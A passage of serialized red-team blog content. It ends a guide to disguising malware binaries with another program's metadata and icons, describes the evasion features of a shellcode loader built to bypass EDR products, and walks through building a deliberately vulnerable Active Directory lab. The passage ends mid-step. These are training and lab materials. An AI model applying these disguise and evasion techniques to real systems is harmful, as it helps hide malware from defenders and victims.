the format needed for the .rc file\nforeach ($property in $versionInfo.PSObject.Properties) {\n    Write-Output \&quot;VALUE `\&quot;$($property.Name)`\&quot;, `\&quot;$($property.Value)`\&quot;\&quot;\n}\n```\n\n**Save this as `extract-metadata.ps1` and run it with:**\n```powershell\n.\\extract-metadata.ps1 \&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;\n```\n\nCopy the output and paste the relevant values into your resource file. \n\nNow, your malware will have the same file properties as the legitimate program.\n\n## Adding Icon to Binary\n\nIt&#39;s also possible to give the binary an icon, which again is a step towards making the binary appear less suspicious.\n\nBefore adding, lets extract an icon from an executable:\n\n### Extracting Icons from EXE\n\n1.  Right-click target executable.\n2.  Select `7-Zip &gt; Open archive`.\n3.  Select the folders `.rsrc &gt; ICON`\n    - &lt;Image src=\&quot;images/31dc2efdd132b66f8df23f7a46c8bc56.png\&quot; alt=\&quot;Location of .rsrc folder\&quot; width=\&quot;258\&quot; height=\&quot;85\&quot; /&gt;\n    - &lt;Image src=\&quot;images/6e879a4006ebee7a048e53210615d746.png\&quot; alt=\&quot;Location of ICON Folder\&quot;  width=\&quot;161\&quot; height=\&quot;115\&quot; /&gt;\n4.  In the ICON folder, you have all the icons from the executable:\n    - &lt;Image src=\&quot;images/aff74750de576bf91c02235a2dde7fac.png\&quot; alt=\&quot;All icons in ICON folder\&quot; width=\&quot;239\&quot; height=\&quot;95\&quot; /&gt;\n\n### Add Icon to Binary\n\n**The steps to add an icon to a binary are shown below.**\n\n1.  `.ico` File Placement\n    - Place the `.ico` file in the same location where the `.sln` file is located.\n    - &lt;Image src=\&quot;images/77542ebbd766e9c4a5bd8f57c647dee7.png\&quot; alt=\&quot;.icon file besides .sln file\&quot;  width=\&quot;222\&quot; height=\&quot;73\&quot; /&gt;\n2.  Modify The Resource File\n    - In the resource file, insert the following line:\n   ```cpp\n   IDI_ICON1 ICON \&quot;&lt;filename&gt;.ico\&quot;\n   ```  \n3.  Build the solution and the binary should now have an icon.\n   - &lt;Image src=\&quot;images/2af03e39f9569f7de1c6d4395ea0c55e.png\&quot; alt=\&quot;File with added Icon.\&quot;  width=\&quot;198\&quot; height=\&quot;115\&quot;/&gt;&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/spoofing-file-details.mdx&quot;],&quot;digest&quot;:[0,&quot;421a28aee2cb19f1&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;spoofing-file-details&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/spoofing-file-details.D_yqCAKs.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;indirect-waffles-shellcode-loader-evade-edr.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Indirect Waffles: Shellcode Loader to Evade EDRs&quot;],&quot;date&quot;:[3,&quot;2024-10-13T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/indirect_waffles.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Shellcode Loader&quot;],[0,&quot;C++&quot;],[0,&quot;EDR Evasion&quot;],[0,&quot;Red Team&quot;],[0,&quot;Malware Development&quot;],[0,&quot;Hacking&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;A shellcode loader with advanced techniques such as HellHall&#39;s indirect syscalls, Early Bird APC injection, and more, to evade EDR detection.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\nWhile preparing for [**CRTO 2**](https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii) and learning from [**Maldev Academy**](https://maldevacademy.com/), I wanted to put everything I had learned into practice. That&#39;s when I created Indirect Waffles, a custom shellcode loader designed for EDR evasion and enhanced by many of the advanced techniques I&#39;ve been studying.\n\n\n## Demo\n\n&lt;Video src=\&quot;demo_indirect_waffles.mp4\&quot; frameborder=\&quot;0\&quot; loop={true} muted={true} /&gt;\n\n## Key Features\n\n- **Enumeration**: Uses **`NtQuerySystemInformation`** to enumerate processes for PPID spoofing and **`NtOpenProcess`** syscall to obtain process handles.\n- **[Custom Dynamic HTTP/s Payload Staging](https://wafflesexploits.github.io/posts/Dynamic-HTTP-Payload-Stager)**\n    - **Check it out on my GitHub**.\n- **Shellcode Decryption: RC4 with runtime key brute-forcing.**\n- **Process Creation with `NtCreateUserProcess`** and the following enhancements:\n    - **Suspended process creation for APC Injection.**\n    - **Parent Process ID (PPID) spoofing**.\n    - **Block DLL injection policy**, preventing third-party DLLs (non-Microsoft signed) from being injected, mitigating some EDR hooking techniques.\n- **Injection**: **Remote Mapped Injection** via syscalls with **RX (Read Execute)** permissions for improved evasion from memory scanners.\n- **Execution**: **Early Bird APC Injection** using syscalls to queue the payload for execution before the target thread resumes execution.\n- **Resumes process** via **`NtResumeThread`** syscall.\n- **Extra Enhancements**:\n    - **Custom string literal obfuscation**: Works on both normal and wide strings.\n        - &lt;Image src=\&quot;images/987594acc9e94e8098463106742ba151.png\&quot; alt=\&quot;fc5156f67325c8e5433bf4fb4bcfa641.png\&quot; width=\&quot;533\&quot; height=\&quot;81\&quot;/&gt;\n    - **Compile-time IAT API hashing** using **`MurmurHash`** to evade static API detection techniques.\n    - **[HellHalls&#39;](https://github.com/Maldev-Academy/HellHall) Indirect Syscall implementation** with compile-time hashing via **`MurmurHash`**.\n        - &lt;Image src=\&quot;images/3da4dfab7736480abdb3581aa95f432e.png\&quot; alt=\&quot;93ee3d54f3f8cac2476da7ad12280d00.png\&quot; width=\&quot;500\&quot; height=\&quot;111\&quot;/&gt;\n- **Anti-Debugging**:\n    - Checks the **PEB flag for the `IsDebugged` flag** to detect the presence of a debugger.\n    - **Anti-debug loop** (30 seconds total):\n        - **3-second sleep intervals** using **`NtWaitForSingleObject`**.\n        - **API hammering** to make the sleep appear more benign.\n    - Uses **`QueryPerformanceCounter`** to measure total loop time; if it exceeds 35 seconds, it is likely being debugged.\n- **Spoofed Binary Metadata**:\n    - **`.DLL`: Spoofed as Notepad++’s `libcurls.dll`**.\n    - **`.EXE`: Spoofed as Notepad++’s `gup.exe`**.\n\n**Learn how to spoof a binary&#39;s metadata &lt;a href=\&quot;/posts/spoof-binary-metada\&quot;&gt;here&lt;/a&gt;**&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/indirect-waffles-shellcode-loader-evade-edr.mdx&quot;],&quot;digest&quot;:[0,&quot;8d37aefd3ae1ed9c&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;indirect-waffles-shellcode-loader-evade-edr&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/indirect_waffles.FyT_HShV.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;how-to-build-malware-lab-elastic-edr.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;How to Easily Build a Malware Testing Lab with Elastic EDR and TCM&#39;s AD Lab&quot;],&quot;date&quot;:[3,&quot;2024-09-22T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/malware-testing-lab.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Malware Lab&quot;],[0,&quot;EDR Setup&quot;],[0,&quot;Elastic EDR&quot;],[0,&quot;Cybersecurity&quot;],[0,&quot;Red Team&quot;],[0,&quot;Penetration testing&quot;]]],&quot;description&quot;:[0,&quot;Learn how to create your own malware testing lab with Elastic EDR and TCM Security&#39;s AD lab for malware evasion testing.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n## Introduction\n\nI wanted to test malware evasion techniques specifically against Elastic EDR, so I decided to build an Active Directory (AD) lab for this purpose.\n\nIn this blog post, I’ll guide you step-by-step on how to create your own malware testing environment.\n\nWe’ll containerize Elastic EDR using Docker, with a fully pre-configured setup that includes Elasticsearch, Kibana, Fleet, and the Detection Engine.\n\nFor the AD lab, we’ll use TCM Security’s Active Directory Lab as the foundation.\n\n## Initial Lab\n\nThis section focuses on creating 3 VMs: 1 Domain Controller and 2 User Machines.\n\nThis initial lab is based entirely on TCM&#39;s Active Directory Lab from the [Practical Ethical Hacking Course](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course). I highly recommend checking out their course.\n\nHowever, you can use any lab environment you prefer, such as [GOAD](https://github.com/Orange-Cyberdefense/GOAD).\n\n### Pre-requisites\n\nRecommended Specs:\n\n- 60 GB Disk Space.\n- 16 GB RAM.\n\nDownload necessary ISOs:\n\n- [Windows Server 2022 ISO](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022).\n- [Windows 11 Enterprise ISO](https://www.microsoft.com/en-us/evalcenter/download-windows-11-enterprise).\n\nDownload a virtualization software:\n\n- VirtualBox.\n- Hyper-V.\n- VMware Workstation Pro.\n    - I will use this one.\n    - You can download it [here](https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.5.1/23298084/windows/core/).\n    - I recommend the version 17.5.1 since it has more features than 17.6.\n\n### Setting up the Domain Controller\n\n#### Creating the Domain Controller VM\n\n1.  After opening VMware, click on \&quot;Create a new Virtual Machine\&quot;.\n2.  Next, Select the configuration `Typical` and click `Next`.\n3.  Select `Installer disc image file (iso)`, and select the `SERVER_EVAL_x64FRE_en-us` file you download.\n    - &lt;Image src=\&quot;images/50c2ba5765a544629b79936dffd759c3.png\&quot; alt=\&quot;b0b2f451839ce45047eb9941b3c5331f.png\&quot; width=\&quot;235\&quot; height=\&quot;51\&quot; /&gt;\n4.  Click `Next`, and you should see this window:\n    - &lt;Image src=\&quot;images/64127b294ecf4cebbc68b6c9463c498a.png\&quot; alt=\&quot;9d32511d8affbacac239afb10d2c29cf.png\&quot; width=\&quot;149\&quot; height=\&quot;105\&quot; /&gt;\n5.  We won&#39;t be using Easy Install, so click `Next`.\n6.  You can use the default Disk options, and click `Next`.\n    - &lt;Image src=\&quot;images/163346d950884a5b9d364467a6ad5453.png\&quot; alt=\&quot;277f8c4ab91ac09cba55147377628f0a.png\&quot; width=\&quot;222\&quot; height=\&quot;115\&quot; /&gt;\n7.  Uncheck `\&quot;Power on this virtual machine after creation\&quot;`, and click `Finish`.\n    - &lt;Image src=\&quot;images/309ea4958fa4464284057d845abbb4c5.png\&quot; alt=\&quot;7f0327af3ed26aa45c032fa809f9e5ec.png\&quot; width=\&quot;297\&quot; height=\&quot;196\&quot; /&gt;\n8.  Click on `\&quot;Edit Virtual Machine Settings\&quot;`.\n9.  Do the following:\n    - Remove the Floppy disk:\n    - &lt;Image src=\&quot;images/79d658d3b49642d986f523cbeb54498b.png\&quot; alt=\&quot;da83be80151024220679eced6fa4f34e.png\&quot; width=\&quot;251\&quot; height=\&quot;142\&quot; /&gt;\n    - Change the memory to 4 GB Ram.\n    - You can lower this down once you have finished the Setup.\n    - Click `Okay` to exit from the Virtual Machine&#39;s settings.\n10. Power the VM.\n11. Press Enter 1-2 times and you should see this screen:\n    - &lt;Image src=\&quot;images/206135dc92e84688b431cd5317a7194f.png\&quot; alt=\&quot;fa43e228d4583ec47c78ed75af723d07.png\&quot; width=\&quot;274\&quot; height=\&quot;202\&quot; /&gt;\n12. Click `Next &gt; Install`.\n13. Select `\&quot;Windows 2022 Standard Evaluation (Desktop Experience)\&quot;`, and click `Next`.\n    - &lt;Image src=\&quot;images/f9e9daf16cb84e16bb9388ea1f6e3f2b.png\&quot; alt=\&quot;9d22b97b7b28b6a57a556431162cfbc3.png\&quot; width=\&quot;250\&quot; height=\&quot;185\&quot; /&gt;\n14. Accept the License terms, and click `Next`.\n15. As the type of installation, Select `Custom`:\n    - &lt;Image src=\&quot;images/b6860f545f9d4fadba65e903b58deb98.png\&quot; alt=\&quot;583defd9d553c703d9792fca22becb89.png\&quot; width=\&quot;316\&quot; height=\&quot;156\&quot; /&gt;\n16. Click `New &gt; Apply &gt; Okay &gt; Next`, and the Windows Server should start installing:\n    - &lt;Image src=\&quot;images/012daafbf6154dfabb06e62029979506.png\&quot; alt=\&quot;01e50fcc1c71017d7505b94db36ead4c.png\&quot; width=\&quot;259\&quot; height=\&quot;126\&quot; /&gt;\n    - &lt;Image src=\&quot;images/400de22961864190a518130012f46250.png\&quot; alt=\&quot;3bf17d77b929b999633e95e649116c70.png\&quot; width=\&quot;257\&quot; height=\&quot;191\&quot; /&gt;\n17. While this installs, you can start installing the User Machines.\n18. After the Server finishes installing, you should have the following screen:\n    - &lt;Image src=\&quot;images/fcb42b95e80e4e71bab68b01cecfb22f.png\&quot; alt=\&quot;3da19e850014680df0d2b0768ec188c3.png\&quot; width=\&quot;359\&quot; height=\&quot;138\&quot; /&gt;\n    - For the password, I will use `Pa$$w0rd!`.\n    - Click `Next`, after you insert your password.\n19. Now, you should be able to login with the password you just set.\n    - Press CRTL+ALT+DEL to show the login screen.\n    - With VMWare you can use this option:\n    - &lt;Image src=\&quot;images/cb16f427de0743eeaa0dc7c642e0dbb6.png\&quot; alt=\&quot;2b3dbbb91fdf15957ae5ea62d55d0acf.png\&quot; width=\&quot;179\&quot; height=\&quot;152\&quot; /&gt;\n20. If the screen is small, it&#39;s because you need to Install VMWare Tools.\n    - On the VM, Select `VM &gt; Install VMware Tools`.\n    - &lt;Image src=\&quot;images/25241c1709a34a449471fc120dba470f.png\&quot; alt=\&quot;9931765d2aedbfee02ed24ffcfc55dea.png\&quot; width=\&quot;178\&quot; height=\&quot;154\&quot; /&gt;\n    - Alternatively, you can directly download the VMware Tools package [here](https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.5.1/23298084/windows/packages/tools-windows.tar), extract the `.tar` with 7zip, and left-click the `.iso`.\n    - Open `setup64`, click `Next` and `Install`.\n    - &lt;Image src=\&quot;images/ef17804184d9410ba35a4a8faac911b2.png\&quot; alt=\&quot;a696b99aa75bfe4729ab98adacdb2b41.png\&quot; width=\&quot;280\&quot; height=\&quot;183\&quot; /&gt;\n    - This should install VMware tools.\n21. Rename your PC\n    1.  Search for `\&quot;About your PC\&quot;` in the Windows Search bar.\n        - &lt;Image src=\&quot;images/badc596b7ca5497b824eeb96af665987.png\&quot; alt=\&quot;cf10b7288e0221f435ea9e6ba8ee8360.png\&quot; width=\&quot;150\&quot; height=\&quot;88\&quot; /&gt;\n    2.  Click on `Rename this PC`, choose a name, click `Next`, and click `Restart now`.\n        - &lt;Image src=\&quot;images/bd782166c7234646a8f964e13ddf5673.png\&quot; alt=\&quot;c7108e11cdbd74fd616357d696fb8497.png\&quot; width=\&quot;544\&quot; height=\&quot;187\&quot; /&gt;\n\n#### Make this machine the Domain Controller\n\n1.  After logging in, In the Server Manager dashboard, Go to `Manage &gt; Add Roles and Features`.\n    - &lt;Image src=\&quot;images/f1aa1b80e5d8485a90d71b656ccdd0dd.png\&quot; alt=\&quot;1dd0a8d9e2039a27be6230881917b513.png\&quot; width=\&quot;511\&quot; height=\&quot;78\&quot;/&gt;\n2.  Click `Next` until the `Server Roles` section, check `\&quot;Active Directory Domain Services\&quot;` and click `Add Features`.\n    - &lt;Image src=\&quot;images/e17f6af2a8ce4fd0861365846da22bcd.png\&quot; alt=\&quot;38c9607ca02ce34a0999325c1ac4d1b1.png\&quot; width=\&quot;226\&quot; height=\&quot;82\&quot; /&gt;\n    - &lt;Image src=\&quot;images/3a6932d8879046e5b62faf2c53f48281.png\&quot; alt=\&quot;ca52d10c577fe32d99c1a51b0a7dbda1.png\&quot; width=\&quot;170\&quot; height=\&quot;164\&quot; /&gt;\n3.  Click `Next` until the `Confirmation` section, check `\&quot;Restart the destination server automatically if required\&quot;`, select `Yes &gt; Install`.\n    - &lt;Image src=\&quot;images/c637619416024c10960b92fadc9a51d1.png\&quot; alt=\&quot;404b5e47cf58e8a5af77d1cbb40ea36d.png\&quot; width=\&quot;447\&quot; height=\&quot;175\&quot; /&gt;\n4.  When the installation finishes, Select `Promote this server to a domain controller`.\n    - &lt;Image src=\&quot;images/d325acfe030049428dcde3ba0c2545a3.png\&quot; alt=\&quot;6b4234f96843115ee1a32f8c4f53d026.png\&quot; width=\&quot;304\&quot; height=\&quot;111\&quot; /&gt;\n5.  Select `Add a new forest`, choose a domain name, and click `Next`.\n    - &lt;Image src=\&quot;images/fc1d2a45b0b94926a5b6c9e543616644.png\&quot; alt=\&quot;6194c1501bc41ca4c35b2855984658c9.png\&quot; width=\&quot;342\&quot; height=\&quot;133\&quot; /&gt;\n6.  In the next window, select a DSRM Password and click `Next`.\n    - I used `Pa$$w0rd!` again.\n    - &lt;Image src=\&quot;images/cc14f9f77173441fbb817aa125da0208.png\&quot; alt=\&quot;f190c61d4bf98301a2d4b18f3b9b5923.png\&quot; width=\&quot;352\&quot; height=\&quot;74\&quot; /&gt;\n7.  Click `Next` until `Prerequisites check`, and Click `Install`.\n8.  After installation, click `Close` and restart the Domain Controller VM.\n9.  After rebooting, In the Server Manager dashboard, Go to `Manage &gt; Add Roles and Features`.\n10. Click `Next` until the `Server Roles` section, check `\&quot;Active Directory Certificate Services\&quot;` and click `Add Features`.\n11. Click `Next` until the `Role Services` section and check if `Certification Authority box` is check.\n12. Click `Next` until `Confirmation` section, check `\&quot;Restart the destination server automatically if required\&quot;`, select `Yes &gt; Install`.\n13. When the installation finishes, Select `Configure Active Directory Certificate Services on the destination server`.\n    - &lt;Image src=\&quot;images/cac938e4087e436588416aae7951cbb7.png\&quot; alt=\&quot;df21f0f637f8347660c4720337b2b429.png\&quot; width=\&quot;283\&quot; height=\&quot;85\&quot; /&gt;\n14. Click `Next`. In the `Role Services` section check the `Certification Authority` box.\n15. Click `Next` until `Validity Period` section, and set the Validity years to `99`.\n16. Click `Next` until `Confirmation` section, click `Configure &gt; Close`, and reboot your server.\n\nYour Domain Server Initial Setup is finally finished! You can [setup the user machines](#setting-up-the-user-machines).\n\n### Setting up the User Machines\n\n#### Creating the Users VMs\n\nThis is almost identical to [Creating the Domain Controller VM](#creating-the-domain-controller-vm), the only difference are:\n\n1.  Use the Windows 11 Enterprise Evaluation ISO:\n    - &lt;Image src=\&quot;images/ff4a1370f30847deb24878b2826c0f50.png\&quot; alt=\&quot;94e6f33f06e05afdf928b82a3e22c5a7.png\&quot; width=\&quot;372\&quot; height=\&quot;39\&quot; /&gt;\n2.  Use the Windows 11 Enterprise as the Version of installation.\n3.  I will name the First machine \&quot;THEPUNISHER\&quot;, and the Second machine \&quot;SPIDERMAN\&quot;.\n4.  VMware will ask you for the encryption type, select `Only the files needed to support a TPM are encrypted`.\n    - I used `12345678` as the password.\n    - &lt;Image src=\&quot;images/d72021360e894174928e8289b5284189.png\&quot; alt=\&quot;14ca204077e5fdc3e0271408c9889c6a.png\&quot; width=\&quot;268\&quot; height=\&quot;124\&quot; /&gt;\n5.  After the installation finishes, select `Sign-in options &gt; Domain join instead`.\n    - This will allows us to create an Local Account.\n6.  For the user name, I will use `frankcastle` for `THEPUNISHER`, and `peterparker` for `SPIDERMAN`.\n7.  For the password, I will use `Password1` for `THEPUNISHER`, `Password2` for `SPIDERMAN`.\n8.  For the security questions, I will use `bob` for everything.\n9.  Rename the PCs to their VM Name respectively, `THEPUNISHER` and `SPIDERMAN`, and restart them.\n\n### Setting up Users, Groups, and Policies on the Domain Controller\n\n1.  Start the DC (Domain Controller) VM, and search for `Active Directory Users and Computers`, and open it.\n2.  Right-click on `MARVEL.local` and select `New &gt; Organizational Unit`.\n    - &lt;Image src=\&quot;images/54b2df1c23fa4ae58f73f1463c53777e.png\&quot; alt=\&quot;c86a34f1a205359a684467ca40168f92.png\&quot; width=\&quot;263\&quot; height=\&quot;159\&quot; /&gt;\n3.  Name it `\&quot;Groups\&quot;` and click `Okay`.\n4.  Left-click on the `Users`, click on `Type` to organize users by type, select all Users that belong to the type `\&quot;Security Group\&quot;` and drag them to the OU (Organizational Unit) named Groups, that you just created.\n    - &lt;Image src=\&quot;images/5d51cbd07ae740c68f692183a8c431f7.png\&quot; alt=\&quot;4e5b2860d5d93c9282a8ff706fb0459d.png\&quot; width=\&quot;315\&quot; height=\&quot;225\&quot; /&gt;\n5.  Right-click on the Administrator user and select `Copy...`.\n    - &lt;Image src=\&quot;images/7b6f63cef6c647798126f6fd8f480d12.png\&quot; alt=\&quot;667f6f6be9f7cfebe799c09cb64feb20.png\&quot; width=\&quot;185\&quot; height=\&quot;56\&quot; /&gt;\n6.  Create the Tony Stark user:\n    - &lt;Image src=\&quot;images/00d85bace0a749278d61cac373cdcc17.png\&quot; alt=\&quot;78918d2d4e3b7aa755a39bf3d0066aba.png\&quot; width=\&quot;235\&quot; height=\&quot;205\&quot; /&gt;\n    - &lt;Image src=\&quot;images/840596f5da234a9e8af979ab09885474.png\&quot; alt=\&quot;f1dd770344a86dbc7f716b6fc747edae.png\&quot; width=\&quot;219\&quot; height=\&quot;135\&quot; /&gt;\n    - Password: `Password12345!`\n    - Check `Password never expires`.\n7.  Create another user the same way you created Tony stark:\n    - Full Name: SQL Service\n    - User Logon: SQLService\n    - Password: `MYpassword123#`\n    - Check `Password never expires`.\n    - After creating the user, right-click on him, select `Properties`, set its description to `\&quot;My password is MYpassword123#\&quot;`, and select `Apply &gt; Okay`.\n8.  Right-click on the Users, select `New &gt; User`.\n    - &lt;Image src=\&quot;images/89a866ea865242199ee7517f7d9f915b.png\&quot; alt=\&quot;469bbf648398431140308aeb33a0c027.png\&quot; width=\&quot;238\&quot; height=\&quot;155\&quot; /&gt;\n9.  Create 2 users with this method:\n    - First User:\n        - Full Name: Frank Castle\n        - User Logon: fcastle\n        - Password: `Password1`\n        - Check `Password never expires`.\n    - Second User:\n        - Full Name: Peter parker\n        - User Logon: pparker\n        - Password: `Password2`\n        - Check `Password never expires`.\n10. In the DC&#39;s Server manager, Go to `File and Storage Services &gt; Shares &gt; TASKS &gt; New Share`.\n    - &lt;Image src=\&quot;images/a7688cd66f034e2e981e499ebb69c1d5.png\&quot; alt=\&quot;fe895e8a21c7b1bcf2dc4ca80b03a720.png\&quot; width=\&quot;162\&quot; height=\&quot;136\&quot; /&gt;\n    - &lt;Image src=\&quot;images/cce781fb771e484aada1511a0689ea52.png\&quot; alt=\&quot;6edbc0073ede98040fc2c936917420ab.png\&quot; width=\&quot;286\&quot; height=\&quot;89\&quot; /&gt;\n11. In the New Share Wizard:\n    1.  Select `SMB Share Quick`.\n    2.  Click `Next` 2 times.\n    3.  Set share name to `hackme`.\n    4.  Click `Next` until `Confirmation`, and click `Create &gt; Close`.\n12. Open the `cmd.exe` on the DC, and run the following  commands:\n```\nsetspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\\SQLService\n```\n13. Check if the SQLService SPN is found:\n```\nsetspn -l SQLService\n```\n14. Right-click the `Ethernet/WIFI` symbol and click on `Open Network &amp; Internet Settings`.\n    \n    - &lt;Image src=\&quot;images/a111b4790986495ea1c19eaf2e47d5ac.png\&quot; alt=\&quot;af55aa0e26c0ac68f9fe7ef45db5fd76.png\&quot; width=\&quot;210\&quot; height=\&quot;88\&quot; /&gt;\n15. On `Advanced Network` settings, select `Network and Sharing Center`.\n    \n16. On `active networks`, click on the `MARVEL.local` Connection.\n    \n    - In my case, it&#39;s `Ethernet0`.\n    - &lt;Image src=\&quot;images/63e813045fdd49108235c5bf472eebe6.png\&quot; alt=\&quot;814bd1d4417d087c041e5ab1b49e2df2.png\&quot; width=\&quot;263\&quot; height=\&quot;58\&quot; /&gt;\n17. Next, Go to `Properties &gt; Internet Protocol Version 4 (TCP/IPv4)`.\n    \n    - &lt;Image src=\&quot;images/5c6769539ed847158aff59e97b762653.png\&quot; alt=\&quot;80ac61c7d3fcd5259888c9cb4a33739e.png\&quot; width=\&quot;301\&quot; height=\&quot;214\&quot; /&gt;\n        \n    - Open `cmd.exe`, run `ipconfig`, and copy the values from the command and use them in the IPv4 Properties, like so:\n        \n        - &lt;Image src=\&quot;images/34e11dfde69f4ee68e7e3d22dfb75196.png\&quot; alt=\&quot;b55a2248fec423a5b038ff6ae4662b9d.png\&quot; width=\&quot;433\&quot; height=\&quot;141\&quot;/&gt;\n    - On the IPv4 Properties, click `Okay &gt; Okay &gt; Close`.\n        \n18. Open any folder, go to the `Network` section, click the blue rectangle with `Click to Change...`, and choose `Turn on Network Discovery and File Sharing`:\n    \n    - &lt;Image src=\&quot;images/c4f6bcc76af94d8dad7d343d09bc7ec5.png\&quot; alt=\&quot;baf310060dc521f0be2c1b944f3c6e94.png\&quot; width=\&quot;238\&quot; height=\&quot;189\&quot; /&gt;\n\nNow, you just need to make the [user machines join the Domain](#join-user-machines-to-domain).\n\n### Join User Machines to Domain\n\nThe final step is to make the user machines join the `MARVEL.local` Domain.\n\nRepeat the following steps for both User Machines:\n\n1.  On the Windows search bar, Search for `Control Panel` and open it.\n2.  Go to `Network and Internet &gt; Network and Sharing Center`.\n3.  On `active networks`, click on the `MARVEL.local` Connection.\n    - In my case, it&#39;s `Ethernet0`.\n    - &lt;Image src=\&quot;images/63e813045fdd49108235c5bf472eebe6.png\&quot; alt=\&quot;814bd1d4417d087c041e5ab1b49e2df2.png\&quot; width=\&quot;263\&quot; height=\&quot;58\&quot; /&gt;\n4.  Next, Go to `Properties &gt; Internet Protocol Version 4 (TCP/IPv4)`.\n5.  For the DNS server address, we will use the IPv4 from the DC :\n    - You can get this by running `ipconfig` on `cmd.exe` on the DC.\n    - &lt;Image src=\&quot;images/3890e38c608044118243003e4f9acb61.png\&quot; alt=\&quot;cae57c04807316fa931c2d28813f62c7.png\&quot; width=\&quot;181\&quot; height=\&quot;205\&quot; /&gt;\n6.  Click `Ok &gt; Ok &gt; Close`.\n7.  In the Windows Search Bar, Search for `Access Work or School` and open it.\n8.  On this new window, Click on `Connect`\n    - &lt;Image src=\&quot;images/9ff51833968c4514939212870a8e173d.png\&quot; alt=\&quot;fc652d571b1f124427b3605954257198.png\&quot; width=\&quot;287\&quot; height=\&quot;51\&quot; /&gt;\n9.  Select `Join this device to a local Active Directory Domain`.\n    - &lt;Image src=\&quot;images/108c39ef358747dc8efd6326eb56059b.png\&quot; alt=\&quot;68cc9925b765a938473772a089e705a0.png\&quot; width=\&quot;187\&quot; height=\&quot;225\&quot; /&gt;\n10. Enter the name of your domain in the new window, click `Next`, and log in with the Administrator account:\n    - &lt;Image src=\&quot;images/1a5168cb07fb48b2a96f3cbca5752719.png\&quot; alt=\&quot;cee3af2ea2b0b3b498366bfb5c02012f.png\&quot; width=\&quot;165\&quot; height=\&quot;90\&quot; /&gt;\n    - &lt;Image src=\&quot;images/5ac968f53ad6427b8c05e35846a6c540.png\&quot; alt=\&quot;1cc899feb53a79e4ca4288ee39140bc8.png\&quot; width=\&quot;126\&quot; height=\&quot;75\&quot; /&gt;\n11. As the `Account type`, select `Administrator`.\n    - &lt;Image src=\&quot;images/f3e36d5f9a1e4e2cbc557fd631a820b9.png\&quot; alt=\&quot;baba590e2f1c7c6a3ea8b236d03e6a8a.png\&quot; width=\&quot;192\&quot; height=\&quot;163\&quot; /&gt;\n12. Click `Next &gt; Restart Now`.\n13. In the Windows search bar, Search for `Edit local users and groups` and open it:\n    - &lt;Image src=\&quot;images/a26e2a4efcd84404b03ecd073417c134.png\&quot; alt=\&quot;20edc9d47ec5ae866c7b3fffcfbb1596.png\&quot; width=\&quot;204\&quot; height=\&quot;131\&quot; /&gt;\n14. In this new window, Left-click `Users`, Right-Click `Administrator` and Select `Set Password &gt; Proceed`.\n    - &lt;Image src=\&quot;images/bbc9957a92ec49448da46d1493c950e4.png\&quot; alt=\&quot;5450c5614ee936bcba31741a8f0dc884.png\&quot; width=\&quot;341\&quot; height=\&quot;71\&quot; /&gt;\n15. Set the Administrator password to `Password1!`.\n16. Only on the `SPIDERMAN` machine, Go to `Groups`, double left-click `Administrators` group, and click `Add`.\n    - Enter `fcastle` and click `Ok &gt; Apply &gt; Ok`.\n    - &lt;Image src=\&quot;images/bbc9957a92ec49448da46d1493c950e4.png\&quot; alt=\&quot;5450c5614ee936bcba31741a8f0dc884.png\&quot; width=\&quot;341\&quot; height=\&quot;71\&quot;/&gt;\n    - This allows you to login into the `SPIDERMAN` machine using the `fcastle` user, enabling lateral movement for practice\n17. Open any folder, go to the `Network` section, click the blue rectangle with `Click to Change...`, and choose `Turn on Network Discovery and File Sharing`:\n    - &lt;Image src=\&quot;images/c4f6bcc76af94d8dad7d343d09bc7ec5.png\&quot; alt=\&quot;baf310060dc521f0be2c1b944f3c6e94.png\&quot; width=\&quot;238\&quot; height=\&quot;189\&quot; /&gt;\n18. Only on the `SPIDERMAN` machine, Open any folder, go to the `This PC` section, click on the 3 dots, and select `Map network drive`.\n    - &lt;Image src=\&quot;images/aa55813d9992487ea166e1f662bd75e6.png\&quot; alt=\&quot;711ea438e3597f2683ebbab4e3dc9653.png\&quot; width=\&quot;258\&quot; height=\&quot;189\&quot; /&gt;\n19. In this new window, write `\\\\HYDRA-DC\\hackme` in the folder name, check `Connect using different credentials`, and click `finish`.\n    - &lt;Image src=\&quot;images/8d1a6417a55f43de9e0b57689b75bd7d.png\&quot; alt=\&quot;60d5159b2a1c399e4ac24908a5295f5e.png\&quot; width=\&quot;312\&quot; 